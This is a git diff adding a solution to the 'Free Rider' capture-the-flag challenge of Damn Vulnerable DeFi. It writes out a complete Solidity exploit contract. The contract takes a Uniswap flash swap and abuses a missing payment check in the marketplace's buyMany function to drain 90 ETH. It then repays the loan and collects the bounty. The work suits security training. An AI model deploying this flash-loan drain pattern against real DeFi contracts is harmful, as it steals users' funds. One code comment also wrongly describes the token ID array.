@@ -123,7 +123,17 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        /* The attack is simply, the marketplace lacks the check when a user buys the same NFT multiple times using buyMany function,
+        the first time the user buys the NFT it will be transferred to the user and the eth will be transferred to the owner of the NFT,
+        the second time since the attacker is the owner, the marketplace will transfer the attacker eth. This can repeat mult times
+        until the attacker has all the eth of the marketplace. Basically we can buy multiple tokens with the same eth.
+
+        We lack the initial 15 eth to buy the first NFT, so we need to get it from the uniswap pair, we can do this by calling the swap function
+        of the uniswap router, we need to make a smart contract that has a function uniswapV2Call that will be called by the uniswap pair when we call the swap function
+        */
+        attack attackContract =
+            new attack{value: PLAYER_INITIAL_ETH_BALANCE}(uniswapPair, marketplace, nft, recoveryManager, weth);
+        attackContract.initiateAttack();
     }
 
     /**
@@ -145,4 +155,85 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+contract attack {
+    IUniswapV2Pair uniswapPair;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableNFT nft;
+    FreeRiderRecoveryManager recoveryManager;
+    WETH weth;
+
+    constructor(
+        IUniswapV2Pair _uniswapPair,
+        FreeRiderNFTMarketplace _marketplace,
+        DamnValuableNFT _nft,
+        FreeRiderRecoveryManager _recoveryManager,
+        WETH _weth
+    ) payable {
+        uniswapPair = _uniswapPair;
+        marketplace = _marketplace;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        weth = _weth;
+    }
+
+    function initiateAttack() public {
+        // we need to get 15 eth to buy the first NFT
+        // The last parameter is the data that will be passed to the uniswapV2Call function, it should not be empty
+        // 0 dvt, 1 weth
+        // we make a flash swap to get 15 eth, we will need to pay it back with fee
+        // the first amount is the weth token, the second amount is the dvt token
+        uniswapPair.swap(15 ether, 0, address(this), "ATTACK");
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        // first we convert the weth to eth
+        weth.withdraw(amount0);
+
+        // there are 6 nfts with id 0 to 5
+        // there is 90 eth in the marketplace which we will drain (6*15 = 90)
+        uint256[] memory tokenIds = new uint256[](6);
+        uint256 nftValue = 15 ether;
+
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+
+        marketplace.buyMany{value: nftValue}(tokenIds); // new uint256[](6) is equivalent to [0, 0, 0, 0, 0, 0]
+        // we buy the first nft 6 times to drain the marketplace
+
+        console.log("Marketplace balance: %s", address(marketplace).balance);
+        console.log("Our balance: %s", address(this).balance);
+
+        // now we have 90 eth
+        // lets first pay back the 15 eth we borrowed with fee
+        // the fee is calculated as amount1 * 3 / 997 (0.3%) we will round up with 1
+        uint256 fee = nftValue * 3 / 997 + 1;
+        uint256 amountToPay = 15 ether + fee;
+        // convert eth to weth and transfer to uniswap pair
+        weth.deposit{value: amountToPay}();
+        weth.transfer(address(uniswapPair), amountToPay);
+
+        // now we transfer all the nft to the recovery manager
+        for (uint256 i = 0; i < 6; i++) {
+            if (i != 5) {
+                nft.safeTransferFrom(address(this), address(recoveryManager), i);
+            } else {
+                address payable player = payable(tx.origin);
+                nft.safeTransferFrom(address(this), address(recoveryManager), 5, abi.encode(player));
+            }
+        }
+
+        // send the player all the eth
+        payable(tx.origin).transfer(address(this).balance);
+    }
+
+    // since the NFTMarketplace uses nft.safeTransferFrom, we need to implement this function
+    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    // to receive eth from the nft marketplace
+    receive() external payable {}
 }
